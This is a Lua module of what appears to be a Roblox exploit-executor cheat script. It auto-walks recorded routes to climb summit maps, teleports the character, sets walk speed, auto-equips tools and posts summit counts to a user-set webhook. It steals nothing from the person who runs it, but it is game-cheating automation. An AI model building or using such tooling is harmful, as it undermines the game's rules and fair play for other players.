    if getgenv()["_SETUP_DONE_setupAutowalkTab"] then return end
    getgenv()["_SETUP_DONE_setupAutowalkTab"] = true
    
    -- ============================================== --
    -- SERVICES & VARIABLES (AUTO WALK)
    -- ============================================== --
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local HttpService = game:GetService("HttpService")
    local TweenService = game:GetService("TweenService")
    local UserInputService = game:GetService("UserInputService")
    local CoreGui = game:GetService("CoreGui")
    
    local player = Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    
    -- ============================================== --
    -- TRACK CONFIGURATION
    -- ============================================== --
    local mainFolder = "POKAYSCRIPT"
    if not isfolder(mainFolder) then
        makefolder(mainFolder)
    end
    
    
    local currentTrack = nil
    local currentJsonFolder = nil
    local currentBaseURL = nil
    local currentJsonFiles = {}
    local trackToggles = {}
    
    -- ============================================== --
    -- AUTO WALK VARIABLES
    -- ============================================== --
    local isPlaying = false
    local isPaused = false
    local pausedTime = 0
    local pauseStartTime = 0
    local playbackConnection = nil
    local currentCheckpoint = 0
    local playbackSpeed = 1.0
    local heightOffset = 0
    local isLoopingEnabled = false
    local loopStartCheckpoint = 0
    local isLoopingActive = false
    local lastPlaybackTime = 0
    local accumulatedTime = 0
    local lastFootstepTime = 0
    local footstepInterval = 0.35
    local leftFootstep = true
    local isFlipped  = false
    local isReversed = false  -- dikendalikan REVBTN di POKAY CORE
    local FLIP_SMOOTHNESS = 0.20
    local currentFlipRotation = CFrame.new()
    local autoRespawnEnabled  = false

    -- Auto Coil (equip tool dari JSON + set walkSpeed)
    local isAutoCoilEnabled   = false
    local lastEquippedTool    = nil   -- nama tool terakhir yang di-equip

    -- BypassTime: compress idle/stop saat rekaman
    local isBypassTimeEnabled = false
    local bypassTimeThreshold = 0.5  -- idle > X detik akan di-compress (default 0.5s)
    local bypassTimeMax       = 0.15 -- idle yang panjang di-cap jadi X detik (default 0.15s)

    -- ============================================== --
    -- HELPER FUNCTIONS
    -- ============================================== --

    -- Equip tool dari Backpack berdasarkan nama (case-insensitive partial match)
    local function equipToolByName(toolName)
        if not toolName or toolName == "" then return end
        if lastEquippedTool == toolName then return end -- sudah ter-equip, skip

        pcall(function()
            local char = player.Character
            if not char then return end
            local hum  = char:FindFirstChildOfClass("Humanoid")
            if not hum then return end

            -- Cari di Backpack
            local backpack = player:FindFirstChildOfClass("Backpack")
            local tool = nil

            if backpack then
                -- Exact match dulu
                tool = backpack:FindFirstChild(toolName)
                -- Partial / case-insensitive match
                if not tool then
                    for _, t in ipairs(backpack:GetChildren()) do
                        if t:IsA("Tool") and t.Name:lower():find(toolName:lower(), 1, true) then
                            tool = t
                            break
                        end
                    end
                end
            end

            -- Juga cek di Character (sudah ter-equip tapi beda nama?)
            if not tool then
                for _, t in ipairs(char:GetChildren()) do
                    if t:IsA("Tool") and (t.Name == toolName or t.Name:lower():find(toolName:lower(), 1, true)) then
                        lastEquippedTool = toolName
                        return -- sudah ada di tangan
                    end
                end
            end

            if tool then
                hum:EquipTool(tool)
                lastEquippedTool = toolName
            end
        end)
    end

    -- Set WalkSpeed karakter dari JSON
    local function applyWalkSpeed(speed)
        if not speed then return end
        pcall(function()
            local char = player.Character
            if not char then return end
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then hum.WalkSpeed = speed end
        end)
    end

    local function playFootstepSound()
        if not humanoid or not character then return end
    
        pcall(function()
            local hrp = character:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
    
            local rayOrigin = hrp.Position
            local rayDirection = Vector3.new(0, -5, 0)
            local raycastParams = RaycastParams.new()
            raycastParams.FilterDescendantsInstances = { character }
            raycastParams.FilterType = Enum.RaycastFilterType.Exclude
    
            local rayResult = workspace:Raycast(rayOrigin, rayDirection, raycastParams)
            if rayResult and rayResult.Instance then
                local material = rayResult.Material
                local sound = Instance.new("Sound")
                sound.Volume = 0.8
                sound.RollOffMaxDistance = 100
                sound.RollOffMinDistance = 10
    
                local soundId = "rbxasset://sounds/action_footsteps_plastic.mp3"
                if material == Enum.Material.Grass then
                    soundId = "rbxassetid://9118823107"
                elseif material == Enum.Material.Metal then
                    soundId = "rbxassetid://260433111"
                elseif material == Enum.Material.Sand then
                    soundId = "rbxassetid://9120089994"
                elseif material == Enum.Material.Wood then
                    soundId = "rbxassetid://9118828605"
                end
    
                sound.SoundId = soundId
                sound.Parent = hrp
                sound:Play()
                game:GetService("Debris"):AddItem(sound, 1)
            end
        end)
    end
    
    local function simulateNaturalMovement(moveDirection, velocity)
        if not humanoid or not character then return end
    
        local horizontalVelocity = Vector3.new(velocity.X, 0, velocity.Z)
        local speed = horizontalVelocity.Magnitude
    
        local onGround = false
        pcall(function()
            local state = humanoid:GetState()
            onGround = (state == Enum.HumanoidStateType.Running or
                state == Enum.HumanoidStateType.RunningNoPhysics or
                state == Enum.HumanoidStateType.Landed)
        end)
    
        if speed > 0.5 and onGround then
            local currentTime = tick()
            local speedMultiplier = math.clamp(speed / 16, 0.3, 2)
            local adjustedInterval = footstepInterval / (speedMultiplier * playbackSpeed)
    
            if currentTime - lastFootstepTime >= adjustedInterval then
                playFootstepSound()
                lastFootstepTime = currentTime
                leftFootstep = not leftFootstep
            end
        end
    end
    
    local function vecToTable(v3)
        return {x = v3.X, y = v3.Y, z = v3.Z}
    end
    
    local function tableToVec(t)
        return Vector3.new(t.x, t.y, t.z)
    end
    
    local function lerp(a, b, t)
        return a + (b - a) * t
    end
    
    local function lerpVector(a, b, t)
        return Vector3.new(lerp(a.X, b.X, t), lerp(a.Y, b.Y, t), lerp(a.Z, b.Z, t))
    end
    
    local function lerpAngle(a, b, t)
        local diff = (b - a)
        while diff > math.pi do diff = diff - 2*math.pi end
        while diff < -math.pi do diff = diff + 2*math.pi end
        return a + diff * t
    end
    

    -- ============================================== --
    -- WEBHOOK SUMMIT HELPER
    -- ============================================== --
    local function sendSummitWebhook()
        if not (getgenv()._MarvWebhookEnabled and getgenv()._MarvWebhookURL ~= "") then return end
        task.spawn(function()
            getgenv()._MarvSummitCount = (getgenv()._MarvSummitCount or 0) + 1
            local sc = getgenv()._MarvSummitCount
            local gameName = tostring(game.PlaceId)
            pcall(function()
                local okG, info = pcall(function()
                    return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
                end)
                if okG and info then gameName = info.Name end
            end)
            local dt2 = os.date("*t")
            local tgl = string.format("%02d/%02d/%04d %02d:%02d", dt2.day, dt2.month, dt2.year, dt2.hour, dt2.min)
            pcall(function()
                local _url  = getgenv()._MarvWebhookURL
                local _body = HttpService:JSONEncode({ embeds = {{
                    title  = "🏔️ Summit Berhasil!",
                    color  = 0xE53935,
                    fields = {
                        {name = "👤 Username",    value = "**" .. RobloxUsername .. "**", inline = true},
                        {name = "🎮 Game",        value = tostring(gameName),             inline = true},
                        {name = "🏆 Summit ke-", value = "**" .. sc .. "**",             inline = true},
                        {name = "📅 Waktu",       value = tgl,                            inline = false},
                    },
                    footer    = {text = "Pokay Script - Push Summit Monitor"},
                    thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(LP.UserId) .. "&width=420&height=420&format=png"},
                }}})
                local _headers = {["Content-Type"]="application/json", ["User-Agent"]="RobloxScript"}
                local httpFunc =
                    (typeof(request)       == "function" and request)          or
                    (typeof(http_request)  == "function" and http_request)     or
                    (syn    and typeof(syn.request)      == "function" and syn.request)    or
                    (http   and typeof(http.request)     == "function" and http.request)   or
                    (fluxus and typeof(fluxus.request)   == "function" and fluxus.request) or
                    nil
                if httpFunc then
                    httpFunc({Url=_url, Method="POST", Headers=_headers, Body=_body})
                else
                    HttpService:RequestAsync({Url=_url, Method="POST", Headers=_headers, Body=_body})
                end
            end)
        end)
    end
    local function EnsureJsonFile(fileName)
        -- Jika fileName adalah full path (dari sistem baru), cukup cek file ada
        if fileName:find("/") or fileName:find("\\") then
            if isfile(fileName) then return true, fileName end
            return false, nil
        end
        -- Legacy: pakai currentJsonFolder + currentBaseURL
        if not currentJsonFolder or not currentBaseURL then
            return false, nil
        end
        local savePath = currentJsonFolder .. "/" .. fileName
        if isfile(savePath) then return true, savePath end
        local ok, res = pcall(function() return game:HttpGet(currentBaseURL .. fileName) end)
        if ok and res and #res > 0 then
            writefile(savePath, res)
            return true, savePath
        end
        return false, nil
    end
    
    local function loadCheckpoint(fileName)
        -- Jika fileName adalah full path, baca langsung
        local filePath
        if fileName:find("/") or fileName:find("\\") then
            filePath = fileName
        else
            if not currentJsonFolder then return nil end
            filePath = currentJsonFolder .. "/" .. fileName
        end
        if not isfile(filePath) then return nil end
        local success, result = pcall(function()
            return HttpService:JSONDecode(readfile(filePath))
        end)
        return success and result or nil
    end
    
    local function findSurroundingFrames(data, t)
        if #data == 0 then
            return nil, nil, 0
        end
    
        if t <= data[1].time then
            return 1, 1, 0
        end
    
        if t >= data[#data].time then
            return #data, #data, 0
        end
    
        local left, right = 1, #data
        while left < right - 1 do
            local mid = math.floor((left + right) / 2)
            if data[mid].time <= t then
                left = mid
            else
                right = mid
            end
        end
    
        local i0, i1 = left, right
        local span = data[i1].time - data[i0].time
        local alpha = span > 0 and math.clamp((t - data[i0].time) / span, 0, 1) or 0
    
        return i0, i1, alpha
    end
    
    local function stopPlayback(forceStopLoop)
        isPlaying = false
        isPaused = false
        pausedTime = 0
        pauseStartTime = 0
        accumulatedTime = 0
        lastPlaybackTime = 0
        heightOffset = 0
        isFlipped = false
        currentFlipRotation = CFrame.new()
        lastEquippedTool = nil  -- reset agar tool bisa di-equip ulang di play berikutnya
        
        if forceStopLoop == true then
            isLoopingActive = false
        end
    
        if playbackConnection then
            playbackConnection:Disconnect()
            playbackConnection = nil
        end
    
        if character and humanoid then
            humanoid:Move(Vector3.new(0, 0, 0), false)
            if humanoid:GetState() ~= Enum.HumanoidStateType.Running and
                humanoid:GetState() ~= Enum.HumanoidStateType.RunningNoPhysics then
                humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
            end
        end
    end
    
    -- -- BypassTime: compress frame-frame idle/stop di rekaman ----------------
    -- Cara kerja:
    --   Scan tiap gap antar frame. Kalau gap > threshold DAN karakter diam
    --   (velocity horizontal ≈ 0 dan state bukan Running/Jumping),
    --   potong gap itu jadi bypassTimeMax.
    --   Semua frame setelahnya di-shift timenya agar kontinyu.
    local function compressIdleFrames(data)
        if not isBypassTimeEnabled then return data end
        if not data or #data < 2 then return data end

        -- Deep copy agar data asli tidak berubah
        local out = {}
        for i, f in ipairs(data) do
            out[i] = {}
            for k, v in pairs(f) do out[i][k] = v end
        end

        local timeShift = 0  -- total waktu yang sudah dikurangi
        for i = 2, #out do
            local prev = out[i - 1]
            local cur  = out[i]
            local gap  = (cur.time - timeShift) - (prev.time)
            -- waktu gap asli di rekaman
            local rawGap = data[i].time - data[i-1].time

            -- Cek apakah frame ini "idle":
            -- velocity horizontal sangat kecil DAN state bukan Running/Jumping
            local vel = data[i-1].velocity or {x=0, y=0, z=0}
            local horizSpeed = math.sqrt((vel.x or 0)^2 + (vel.z or 0)^2)
            local st = tostring(data[i-1].state or "")
            local isMoving = horizSpeed > 1.5
                or st == "Running" or st == "Jumping" or st == "Freefall" or st == "Climbing"

            if rawGap > bypassTimeThreshold and not isMoving then
                -- Gap idle yang panjang → cap jadi bypassTimeMax
                local clippedGap = bypassTimeMax
                timeShift = timeShift + (rawGap - clippedGap)
            end

            -- Apply shift ke frame ini
            out[i].time = data[i].time - timeShift
        end

        return out
    end

    local function startPlayback(data, onComplete)
        if not data or #data == 0 then  
            if onComplete then onComplete() end
            return
        end
    
        if isPlaying then
            stopPlayback()
        end
    
        -- Kalkulasi hipHeight offset
        if character and character:FindFirstChild("HumanoidRootPart") and data[1] then
            local currentHipHeight  = humanoid and humanoid.HipHeight or 2
            local recordedHipHeight = data[1].hipHeight or 2
            heightOffset = currentHipHeight - recordedHipHeight
        end

        -- Hanya teleport ke frame[1] kalau accumulatedTime = 0 (mulai dari awal)
        -- Kalau accumulatedTime sudah di-set (mulai dari frame terdekat), jangan teleport
        if accumulatedTime == 0 then
            if character and character:FindFirstChild("HumanoidRootPart") and data[1] then
                local firstFrame = data[1]
                local startPos   = tableToVec(firstFrame.position)
                local startYaw   = firstFrame.rotation or 0
                local hrp        = character.HumanoidRootPart
                local correctedY = startPos.Y + heightOffset
                hrp.CFrame = CFrame.new(startPos.X, correctedY, startPos.Z) * CFrame.Angles(0, startYaw, 0)
                hrp.AssemblyLinearVelocity  = Vector3.new(0, 0, 0)
                hrp.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
            end
        end

        isPlaying = true
        isPaused  = false
        pausedTime      = 0
        pauseStartTime  = 0
        local playbackStartTime = tick()
        lastPlaybackTime = playbackStartTime
        -- Jangan reset accumulatedTime kalau sudah di-set dari luar (nearest frame)
        -- accumulatedTime sudah di-set di playSingleCheckpointFile sebelum panggil startPlayback
        local lastJumping = false
    
        if playbackConnection then
            playbackConnection:Disconnect()
            playbackConnection = nil
        end
    
        playbackConnection = RunService.Heartbeat:Connect(function(deltaTime)
            if not isPlaying then return end
    
            if isPaused then
                if pauseStartTime == 0 then
                    pauseStartTime = tick()
                end
                lastPlaybackTime = tick()
                return
            else
                if pauseStartTime > 0 then
                    pausedTime = pausedTime + (tick() - pauseStartTime)
                    pauseStartTime = 0
                    lastPlaybackTime = tick()
                end
            end
    
            if not character or not character:FindFirstChild("HumanoidRootPart") then return end
            if not humanoid or humanoid.Parent ~= character then
                humanoid = character:FindFirstChild("Humanoid")
            end
    
            local currentTime = tick()
            local actualDelta = math.min(currentTime - lastPlaybackTime, 0.1)
            lastPlaybackTime = currentTime
            -- Reverse: mundur jika isReversed
            if isReversed then
                accumulatedTime = accumulatedTime - (actualDelta * playbackSpeed)
            else
                accumulatedTime = accumulatedTime + (actualDelta * playbackSpeed)
            end
            local totalDuration = data[#data].time

            -- Clamp & selesai
            if accumulatedTime >= totalDuration then
                if isReversed then
                    accumulatedTime = totalDuration  -- biarkan di ujung
                else
                    stopPlayback()
                    if onComplete then onComplete() end
                    return
                end
            elseif accumulatedTime <= 0 then
                if isReversed then
                    stopPlayback()
                    if onComplete then onComplete() end
                    return
                else
                    accumulatedTime = 0
                end
            end

            local i0, i1, alpha = findSurroundingFrames(data, accumulatedTime)
            local f0, f1 = data[i0], data[i1]
            if not f0 or not f1 then return end
    
            local pos0, pos1 = tableToVec(f0.position), tableToVec(f1.position)
            local vel0, vel1 = tableToVec(f0.velocity or {x = 0, y = 0, z = 0}), tableToVec(f1.velocity or {x = 0, y = 0, z = 0})
            local move0, move1 = tableToVec(f0.moveDirection or {x = 0, y = 0, z = 0}), tableToVec(f1.moveDirection or {x = 0, y = 0, z = 0})
            local yaw0, yaw1 = f0.rotation or 0, f1.rotation or 0
    
            local interpPos = lerpVector(pos0, pos1, alpha)
            local interpVel = lerpVector(vel0, vel1, alpha)
            local interpMove = lerpVector(move0, move1, alpha)
            local interpYaw = lerpAngle(yaw0, yaw1, alpha)
            local hrp = character.HumanoidRootPart
    
            local correctedY = interpPos.Y + heightOffset
            local targetCFrame = CFrame.new(interpPos.X, correctedY, interpPos.Z) * CFrame.Angles(0, interpYaw, 0)
            local targetFlipRotation = isFlipped and CFrame.Angles(0, math.pi, 0) or CFrame.new()
            currentFlipRotation = currentFlipRotation:Lerp(targetFlipRotation, FLIP_SMOOTHNESS)
    
            local lerpFactor = math.clamp(1 - math.exp(-12 * actualDelta), 0, 1)
            hrp.CFrame = hrp.CFrame:Lerp(targetCFrame * currentFlipRotation, lerpFactor)
            simulateNaturalMovement(interpMove, interpVel)
    
            pcall(function()
                hrp.AssemblyLinearVelocity = interpVel
            end)
    
            if humanoid then
                humanoid:Move(interpMove, false)
            end

            -- Auto Coil: equip tool dari JSON frame
            if isAutoCoilEnabled then
                local frameTool = f0.tool
                if frameTool and frameTool ~= "" then
                    equipToolByName(frameTool)
                end
                -- Apply walkSpeed dari JSON
                local frameSpeed = f0.walkSpeed
                if frameSpeed and frameSpeed > 0 then
                    applyWalkSpeed(frameSpeed)
                end
            end
    
            local jumpingNow = f0.jumping or false
            if f1.jumping then jumpingNow = true end
            if jumpingNow and not lastJumping then
                if humanoid then
                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                end
            end
            lastJumping = jumpingNow
        end)
    end
    
    local function getNextCheckpointIndex(currentIndex)
        if currentIndex >= #currentJsonFiles then
            return 1
        else
            return currentIndex + 1
        end
    end
    
    local function playCheckpointSequence(startIndex)
        if not isLoopingEnabled then return end
    
        isLoopingActive = true
        local currentIndex = startIndex
    
        local function playNext()
            if not isLoopingActive or not isLoopingEnabled then
                return
            end
    
            local fileName = currentJsonFiles[currentIndex]
            local ok = EnsureJsonFile(fileName)
            if not ok then
                WindUI:Notify({
                    Title = "Error",
                    Content = "Tidak dapat memuat file: " .. fileName,
                    Duration = 4,
                    Icon = "x-circle"
                })
                stopPlayback(true)
                return
            end
    
            local data = loadCheckpoint(fileName)
            if not data or #data == 0 then
                WindUI:Notify({
                    Title = "Error",
                    Content = "Checkpoint kosong: " .. fileName,
                    Duration = 4,
                    Icon = "file-x"
                })
                stopPlayback(true)
                return
            end
    
            local humanoidLocal = character:FindFirstChildOfClass("Humanoid")
            local hrp = character:FindFirstChild("HumanoidRootPart")
    
            if not humanoidLocal or not hrp then
                stopPlayback(true)
                return
            end
    
            -- Cari frame terdekat dari posisi player (scan semua frame, tanpa skip)
            local playerPos = hrp.Position
            local bestIdx  = 1
            local bestDist = math.huge
            local compressed = compressIdleFrames(data)
            for i = 1, #compressed do
                local fp = tableToVec(compressed[i].position)
                local d  = (playerPos - fp).Magnitude
                if d < bestDist then bestDist = d; bestIdx = i end
            end

            if bestDist > 35 then
                WindUI:Notify({
                    Title   = "⚠️ Jarak Terlalu Jauh",
                    Content = string.format("Jarak ke rute terdekat: %.0f studs\nMaksimal 35 studs. Pindah lebih dekat ke jalur!", bestDist),
                    Duration = 5,
                    Icon    = "map-pin-off"
                })
                stopPlayback(true)
                return
            end

            -- Langsung lanjutkan rute dari frame terdekat tanpa MoveTo
            accumulatedTime = compressed[bestIdx].time or 0

            startPlayback(compressed, function()
                if currentIndex == #currentJsonFiles then
                    if autoRespawnEnabled then
                        WindUI:Notify({
                            Title = "Auto Respawn",
                            Content = "Respawn otomatis...",
                            Duration = 3,
                            Icon = "refresh-cw"
                        })
    
                        pcall(function()
                            local h = character:FindFirstChildOfClass("Humanoid")
                            if h then h.Health = 0 end
                        end)
    
                        local newChar = player.CharacterAdded:Wait()
                        character = newChar
                        humanoid = newChar:WaitForChild("Humanoid")
                        humanoidRootPart = newChar:WaitForChild("HumanoidRootPart")
    
                        task.wait(1)
    
                        currentIndex = 1
                        playNext()
                        return
                    end
                end
    
                if currentIndex == #currentJsonFiles then
                    sendSummitWebhook()
                    currentIndex = 1
                else
                    currentIndex = currentIndex + 1
                end
    
                playNext()
            end)
        end
    
        playNext()
    end
    
    local function playSingleCheckpointFile(fileName)
        stopPlayback(true)

        -- Karakter fresh
        local char2 = player.Character
        if not char2 then
            WindUI:Notify({Title="Error", Content="Character belum spawn!", Duration=3, Icon="user-x"})
            return
        end
        local hrp2 = char2:FindFirstChild("HumanoidRootPart")
        local hum2 = char2:FindFirstChildOfClass("Humanoid")
        character = char2
        if hum2 then humanoid = hum2 end
        if hrp2 then humanoidRootPart = hrp2 end

        if not hrp2 or not hum2 then
            WindUI:Notify({Title="Error", Content="Character tidak valid!", Duration=3, Icon="user-x"})
            return
        end

        -- Load data
        local data = loadCheckpoint(fileName)
        if not data or #data == 0 then
            WindUI:Notify({Title="Error", Content="File invalid / kosong", Duration=4, Icon="file-x"})
            return
        end

        local isNewFormat = type(data[1]) == "table" and data[1].time ~= nil

        -- -- Helper: cari index frame terdekat dari posisi player --
        local function findNearestFrameIndex(d, playerPos)
            local bestIdx  = 1
            local bestDist = math.huge
            -- Sample setiap N frame agar cepat
            local step = math.max(1, math.floor(#d / 200))
            for i = 1, #d, step do
                local fp
                if isNewFormat then
                    fp = tableToVec(d[i].position)
                else
                    local f = d[i]
                    fp = Vector3.new(f.x or 0, f.y or 0, f.z or 0)
                end
                local dist = (playerPos - fp).Magnitude
                if dist < bestDist then
                    bestDist = dist
                    bestIdx  = i
                end
            end
            return bestIdx, bestDist
        end

        -- -- Helper: jalan natural ke posisi target (tanpa teleport) --
        local function walkToTarget(targetPos, onDone)
            -- Cek jarak
            local dist = (hrp2.Position - targetPos).Magnitude
            if dist < 4 then
                onDone()
                return
            end

            if dist > 35 then
                WindUI:Notify({
                    Title   = "⚠️ Jarak Terlalu Jauh",
                    Content = string.format("Jarak ke jalur: %.0f studs\nMaksimal 35 studs. Pindah lebih dekat dulu!", dist),
                    Duration = 5, Icon = "map-pin-off"
                })
                stopPlayback(true)
                return
            end

            WindUI:Notify({
                Title   = "🚶 Menuju Jalur",
                Content = string.format("Jarak %.0f studs, berjalan ke jalur terdekat...", dist),
                Duration = 3, Icon = "map-pin"
            })

            local reached = false
            local conn = hum2.MoveToFinished:Connect(function(r)
                reached = r
            end)

            -- Berjalan dengan MoveToFinished — timeout 30 detik
            hum2:MoveTo(targetPos)
            local t0 = tick()
            task.spawn(function()
                while not reached and tick()-t0 < 30 and isPlaying ~= true do
                    task.wait(0.1)
                end
                pcall(function() conn:Disconnect() end)
                onDone()
            end)
        end

        if isNewFormat then
            -- Scan SEMUA frame untuk cari yang paling dekat (tanpa skip)
            local playerPos = hrp2.Position
            local bestIdx2  = 1
            local bestDist2 = math.huge
            for i = 1, #data do
                local fp = tableToVec(data[i].position)
                local d  = (playerPos - fp).Magnitude
                if d < bestDist2 then bestDist2 = d; bestIdx2 = i end
            end

            if bestDist2 > 35 then
                WindUI:Notify({
                    Title   = "⚠️ Jarak Terlalu Jauh",
                    Content = string.format("Jarak ke rute terdekat: %.0f studs\nMaksimal 35 studs. Pindah lebih dekat ke jalur!", bestDist2),
                    Duration = 5, Icon = "map-pin-off"
                })
                stopPlayback(true)
                return
            end

            -- Langsung lanjutkan dari frame terdekat, tanpa MoveTo
            accumulatedTime = data[bestIdx2].time or 0

            if isLoopingEnabled then
                loopStartCheckpoint = 1
                playCheckpointSequence(1)
            else
                startPlayback(compressIdleFrames(data), function()
                    sendSummitWebhook()
                    WindUI:Notify({Title="✅ Selesai", Content="Auto walk selesai!", Duration=2, Icon="check-check"})
                end)
            end

        else
            -- Format lama {x,y,z}: cari frame terdekat & mulai dari sana
            local playerPos = hrp2.Position
            local nearIdx, nearDist = findNearestFrameIndex(data, playerPos)
            local nearF = data[nearIdx]
            local nearPos = Vector3.new(nearF.x or 0, nearF.y or 0, nearF.z or 0)

            WindUI:Notify({
                Title   = "▶ Playing",
                Content = string.format("Frames: %d | Mulai frame #%d", #data, nearIdx),
                Duration = 2, Icon = "play"
            })

            walkToTarget(nearPos, function()
                isPlaying        = true
                isPaused         = false
                accumulatedTime  = nearIdx - 1
                lastPlaybackTime = tick()

                if playbackConnection then playbackConnection:Disconnect(); playbackConnection = nil end
                local frames = data
                playbackConnection = RunService.Heartbeat:Connect(function(dt)
                    if not isPlaying or isPaused then return end
                    local c3 = player.Character
                    if not c3 then return end
                    local r3 = c3:FindFirstChild("HumanoidRootPart")
                    if not r3 then return end

                    if isReversed then
                        accumulatedTime = accumulatedTime - dt * playbackSpeed * 60
                    else
                        accumulatedTime = accumulatedTime + dt * playbackSpeed * 60
                    end
                    local idx = math.clamp(math.floor(accumulatedTime)+1, 1, #frames)
                    local f = frames[idx]
                    if type(f) == "table" then
                        local yo  = heightOffset or 0
                        local nPos = Vector3.new((f.x or 0), (f.y or 0) + yo, (f.z or 0))
                        local flipCF = isFlipped and CFrame.fromEulerAnglesYXZ(0, math.pi, 0) or CFrame.new()
                        pcall(function() r3.CFrame = CFrame.new(nPos) * flipCF end)
                    end

                    local atEnd   = idx >= #frames
                    local atStart = accumulatedTime <= 0
                    if (not isReversed and atEnd) or (isReversed and atStart) then
                        if isLoopingEnabled then
                            accumulatedTime = isReversed and #frames-1 or 0
                            sendSummitWebhook()
                        else
                            stopPlayback(false)
                            sendSummitWebhook()
                            WindUI:Notify({Title="✅ Selesai", Content="Playback selesai!", Duration=3, Icon="check-check"})
                        end
                    end
                end)
            end)
        end
    end
    
    -- ============================================== --
    -- PAUSE/FLIP UI
    -- ============================================== --
    local BTN_COLOR = Color3.fromRGB(35, 35, 40)
    local BTN_HOVER = Color3.fromRGB(55, 55, 60)
    local TEXT_COLOR = Color3.fromRGB(255, 255, 255)
    local ACTIVE_COLOR = Color3.fromRGB(200, 30, 30)
    
    local function createPauseFlipUI()
        local ui = Instance.new("ScreenGui")
        ui.Name           = "PokayCoreUI"
        ui.IgnoreGuiInset = true
        ui.ResetOnSpawn   = false
        ui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        ui.Parent         = CoreGui

        -- -- Palette ------------------------------------------
        local C_BG       = Color3.fromRGB(8,  10, 18)
        local C_BORDER   = Color3.fromRGB(0,  210, 255)
        local C_PLA      = Color3.fromRGB(15, 185, 80)
        local C_STO      = Color3.fromRGB(200, 40, 40)
        local C_REV      = Color3.fromRGB(220, 140, 0)
        local C_FLP      = Color3.fromRGB(110, 60, 220)
        local C_ACT_GLO  = Color3.fromRGB(255, 255, 80)
        local C_TXT      = Color3.fromRGB(230, 240, 255)
        local C_LBL      = Color3.fromRGB(0,   210, 255)
        local C_DOT_RDY  = Color3.fromRGB(60,  220, 100)
        local C_DOT_PLY  = Color3.fromRGB(255,  70,  70)

        -- -- Ukuran panel — compact 220x104 -------------------
        local PW, PH = 220, 104

        local panel = Instance.new("Frame")
        panel.Name             = "PokayCorePanel"
        panel.BackgroundColor3 = C_BG
        panel.BackgroundTransparency = 0.08
        panel.BorderSizePixel  = 0
        panel.AnchorPoint      = Vector2.new(0.5, 1)
        panel.Position         = UDim2.new(0.5, 0, 0.94, 0)
        panel.Size             = UDim2.new(0, PW, 0, PH)
        panel.Visible          = false
        panel.Parent           = ui
        Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 14)

        -- neon outer glow via UIStroke
        local stroke = Instance.new("UIStroke", panel)
        stroke.Color        = C_BORDER
        stroke.Thickness    = 1.5
        stroke.Transparency = 0.1

        -- -- Header bar (drag target) --------------------------
        local hdr = Instance.new("Frame", panel)
        hdr.BackgroundTransparency = 1
        hdr.Size     = UDim2.new(1, -10, 0, 22)
        hdr.Position = UDim2.new(0, 5, 0, 3)

        local titleLbl = Instance.new("TextLabel", hdr)
        titleLbl.BackgroundTransparency = 1
        titleLbl.Size      = UDim2.new(0.65, 0, 1, 0)
        titleLbl.Font      = Enum.Font.GothamBold
        titleLbl.TextSize  = 12
        titleLbl.TextColor3 = C_BORDER
        titleLbl.TextXAlignment = Enum.TextXAlignment.Left
        titleLbl.Text = "◆ POKAY CORE"

        local statusDot = Instance.new("TextLabel", hdr)
        statusDot.BackgroundTransparency = 1
        statusDot.Size      = UDim2.new(0.35, 0, 1, 0)
        statusDot.Position  = UDim2.new(0.65, 0, 0, 0)
        statusDot.Font      = Enum.Font.GothamBold
        statusDot.TextSize  = 10
        statusDot.TextColor3 = C_DOT_RDY
        statusDot.TextXAlignment = Enum.TextXAlignment.Right
        statusDot.Text = "● READY"

        -- thin divider under header
        local div = Instance.new("Frame", panel)
        div.BackgroundColor3 = C_BORDER
        div.BorderSizePixel  = 0
        div.Size     = UDim2.new(1, -16, 0, 1)
        div.Position = UDim2.new(0, 8, 0, 27)
        div.BackgroundTransparency = 0.5
        local dg = Instance.new("UIGradient", div)
        dg.Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0,   1),
            NumberSequenceKeypoint.new(0.1, 0),
            NumberSequenceKeypoint.new(0.9, 0),
            NumberSequenceKeypoint.new(1,   1),
        })

        -- -- Button row ----------------------------------------
        local row = Instance.new("Frame", panel)
        row.BackgroundTransparency = 1
        row.Size     = UDim2.new(1, -10, 0, 68)
        row.Position = UDim2.new(0, 5, 0, 31)
        local rl = Instance.new("UIListLayout", row)
        rl.FillDirection       = Enum.FillDirection.Horizontal
        rl.HorizontalAlignment = Enum.HorizontalAlignment.Center
        rl.VerticalAlignment   = Enum.VerticalAlignment.Center
        rl.Padding             = UDim.new(0, 5)

        local BW, BH, LH = 58, 42, 14

        local function makeBtn(icon, ltext, bg)
            local wrap = Instance.new("Frame", row)
            wrap.BackgroundTransparency = 1
            wrap.Size = UDim2.new(0, BW, 0, BH + LH + 2)

            local btn = Instance.new("TextButton", wrap)
            btn.Size             = UDim2.new(0, BW, 0, BH)
            btn.BackgroundColor3 = bg
            btn.BackgroundTransparency = 0.25
            btn.Text             = icon
            btn.TextColor3       = C_TXT
            btn.Font             = Enum.Font.GothamBold
            btn.TextSize         = 19
            btn.AutoButtonColor  = false
            btn.BorderSizePixel  = 0
            Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 9)
            local st = Instance.new("UIStroke", btn)
            st.Color = bg:Lerp(Color3.new(1,1,1), 0.4); st.Thickness = 1.2; st.Transparency = 0.3

            -- hover glow
            btn.MouseEnter:Connect(function()
                btn.BackgroundTransparency = 0.05
                st.Transparency = 0
            end)
            btn.MouseLeave:Connect(function()
                btn.BackgroundTransparency = 0.25
                st.Transparency = 0.3
            end)

            local lbl = Instance.new("TextLabel", wrap)
            lbl.BackgroundTransparency = 1
            lbl.Size      = UDim2.new(1, 0, 0, LH)
            lbl.Position  = UDim2.new(0, 0, 0, BH + 2)
            lbl.Font      = Enum.Font.GothamBold
            lbl.TextSize  = 9
            lbl.TextColor3 = C_LBL
            lbl.TextXAlignment = Enum.TextXAlignment.Center
            lbl.Text = ltext

            return btn, lbl
        end

